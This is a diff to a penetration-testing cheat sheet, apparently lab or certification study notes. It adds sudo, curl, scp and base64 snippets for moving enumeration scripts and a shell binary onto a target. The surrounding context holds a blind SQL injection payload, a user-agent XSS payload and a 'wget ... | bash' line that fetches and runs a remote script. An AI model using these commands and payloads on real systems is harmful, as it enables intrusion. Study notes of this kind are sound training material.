@@ -13,6 +13,7 @@
   - [SQLi](#sqli)
  
 - [Tools](#tools)
+  - [sudo](#sudo)
   - [Vim](#vim)
   - [NMAP](#nmap)
   - [feroxbuster](#feroxbuster)
@@ -22,6 +23,7 @@
   - [ffuf](#ffuf)
   - [curl](#curl)
   - [wget](#wget)
+  - [SCP](#scp)
   - [Python](#python)
   - [Hashcat](#hashcat)
   - [John The Ripper](#john-the-ripper)
@@ -444,6 +446,16 @@ http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -
 ```
 
 ## Tools
+### sudo
+```bash
+#switch to root user
+sudo su -
+
+# run command as lamster
+sudo -u lamster /bin/echo Hello World!
+
+```
+
 ### Vim
 ```bash
 x	Cut character
@@ -563,6 +575,9 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-11000
 # finger print
 curl -IL https://www.inlanefreight.com
 
+# download files
+curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
+
 # -v : When the web page looks like above, use -v for debugging and getting extra information about the response from server
 We can find the stack information as well(ex. saltstack)
 curl -v target:port
@@ -590,6 +605,22 @@ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(...))</sc
 ```bash
 # Download a file and execute it
 wget -O - http://192.168.45.175:443/lse.sh | bash
+```
+
+### SCP
+```bash
+scp linenum.sh user@remotehost:/tmp/linenum.sh
+```
+
+### base64
+```bash
+# first get the encrypted value of the shell file
+base64 shell -w 0
+# revert it back to shell file..!
+echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
+
+
+
 ```
 
 ### Python
